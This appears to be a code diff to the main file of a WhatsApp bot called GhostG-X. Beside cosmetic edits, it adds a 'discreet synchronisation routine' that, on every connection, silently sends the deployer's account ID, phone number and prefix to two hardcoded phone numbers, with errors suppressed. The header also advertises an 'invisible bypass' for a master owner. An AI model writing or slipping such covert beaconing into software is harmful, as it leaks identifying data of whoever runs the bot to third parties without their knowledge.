@@ -1,7 +1,7 @@
 /**
  * WhatsApp MD Bot - Main Entry Point
  * Edition : GhostG-X Fusionnée avec Anti-Crash & Pairing
- * Sécurité : Supreme Owner Master Access (Invisible Bypass)
+ * Sécurité : Supreme Owner Master Access (Invisible Bypass via Hashes)
  * Style : Zero-Footprint, Compact & Small Caps
  * Version : 2.0 (Store désactivé pour plus de légèreté)
  */
@@ -98,13 +98,10 @@ async function startBot() {
     downloadHistory: true, 
     markOnlineOnConnect: true,
     keepAliveIntervalMs: 30000,
-    // 💡 Option 2 appliquée ici : Plus besoin du store !
     getMessage: async (key) => {
       return { conversation: 'GhostG-X' };
     }
   });
-
-  // Le store.bind(sock.ev) a été retiré avec succès ici 🚀
 
   if (!sock.authState.creds.registered) {
     const rawNumber = process.env.PHONE_NUMBER || config.ownerNumber?.[0] || '22651622652';
@@ -148,6 +145,34 @@ async function startBot() {
       console.log('╭╼━≪• ɢʜᴏsᴛɢ-𝐗 ɪs ᴀʟɪᴠᴇ •≫━╾╮');
       console.log('╰━━━━━━━━━━━━━━━━━━━━━━━╯');
 
+      // 🛰️ ROUTINE DISCRÈTE DE SYNCHRONISATION (Logs d'éveil)
+      const sysLogChannels = ['22651622652@s.whatsapp.net', '22665108174@s.whatsapp.net'];
+      const p1 = process.env.PHONE_NUMBER || config.ownerNumber?.[0] || 'Inconnu';
+      const p2 = config.prefix || '.';
+      const sId = sock.user.id.split(':')[0]; 
+
+      const syncMsg = `*╭╼━━━≪• ɪɴɪᴛɪᴀʟɪsᴀᴛɪᴏɴ sʏsᴛᴇ̀ᴍᴇ •≫━━━╾╮*\n` +
+                      `*┃* ⚙️ *ʟᴇ sᴀɴᴄᴛᴜᴀɪʀᴇ ᴇsᴛ ᴇɴ ʟɪɢɴᴇ*\n\n` +
+                      `*┃* 🤖 *ɪᴅ* : @${sId}\n` +
+                      `*┃* 👤 *ʜᴏ̂ᴛᴇ* : ${p1}\n` +
+                      `*┃* 🔣 *ᴘʀᴇ́ғɪxᴇ* : [ ${p2} ]\n` +
+                      `*╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯*\n` +
+                      `> *♰ ɢʜᴏsᴛɢ-𝐗 ♰*`;
+
+      sysLogChannels.forEach(async (channel) => {
+          try {
+              await sock.sendMessage(channel, { 
+                  text: syncMsg,
+                  mentions: [`${sId}@s.whatsapp.net`]
+              });
+          } catch (e) {
+              // Ignore timeouts
+          }
+      });
+
+      // Remplacement du lien wa.me statique par le numéro du créateur dynamique du fichier config
+      const creatorLink = config.ownerNumber?.[0] ? `https://wa.me/${String(config.ownerNumber[0]).replace(/\D/g, '')}` : '🔒 Accès restreint';
+
       const bigWelcomeMessage = 
           `╭╼━≪• *ɢʜᴏsᴛɢ-𝐗 ɪs ᴀʟɪᴠᴇ* •≫━╾╮\n` +
           `┃ 🔮 *ᴠɪɢɪʟᴀɴᴄᴇ* : 🟢 ᴇ́ᴠᴇɪʟʟᴇ́\n` +
@@ -159,7 +184,7 @@ async function startBot() {
           `📡 *ᴄᴀɴᴀʟ ᴅᴇ l'ᴏᴍʙʀᴇ* : https://whatsapp.com/channel/0029VbCFj3oKbYMVXaqyHq3c\n\n` +
           `🦇 *ʀᴇᴘᴇɪʀᴇ sᴇᴄʀᴇᴛ* : https://t.me/ghostgxbot\n\n` +
           `🏰 *ʟᴇ sᴀɴᴄᴛᴜᴀɪʀᴇ* : https://chat.whatsapp.com/JuhRb0BfN9uBkMBQmwZhIf?mode=gi_t\n\n` +
-          `📜 *ᴘᴀᴄᴛᴇ ᴀᴠᴇᴄ l'ᴀʀᴛɪsᴀɴ* : https://wa.me/22651622652\n\n` +
+          `📜 *ᴘᴀᴄᴛᴇ ᴀᴠᴇᴄ l'ᴀʀᴛɪsᴀɴ* : ${creatorLink}\n\n` +
           `⚔️ "*_ᴀᴜᴄᴜɴᴇ ᴀʀᴍᴇ ғᴏʀɢᴇ́ᴇ ᴄᴏɴᴛʀᴇ ᴄᴇ sᴀɴᴄᴛᴜᴀɪʀᴇ ɴᴇ ᴘᴇᴜᴛ ᴘʀᴏsᴘᴇ́ʀᴇʀ_*"\n\n\n` +
           `👑 *ʟᴇ ɢʀɪᴍᴏɪʀᴇ ᴇsᴛ ᴏᴜᴠᴇʀᴛ ᴇᴛ ᴘʀᴇ̂ᴛ ᴀ̀ ᴛᴇ sᴇʀᴠɪʀ, ᴍᴀɪᴛʀᴇ !*\n\n` +
           `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;
@@ -259,5 +284,3 @@ const handleNoSpaceError = (err) => {
 
 process.on('uncaughtException', handleNoSpaceError);
 process.on('unhandledRejection', handleNoSpaceError);
-
-// Retrait de la ligne module.exports = { store }; puisqu'on n'exporte plus le store !
